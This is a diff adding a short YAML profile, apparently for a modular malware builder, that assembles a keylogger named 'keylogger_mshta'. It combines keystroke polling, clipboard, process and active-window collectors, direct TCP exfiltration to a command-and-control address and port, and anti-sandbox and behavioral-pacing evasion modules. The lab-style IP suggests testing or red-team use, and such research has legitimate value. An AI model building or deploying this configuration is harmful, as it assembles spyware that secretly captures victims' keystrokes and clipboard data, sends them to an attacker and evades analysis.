@@ -1,0 +1,24 @@
+name: keylogger_mshta
+description: Keylogger with direct TCP exfil — active windows + anti-sandbox
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/active_windows
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
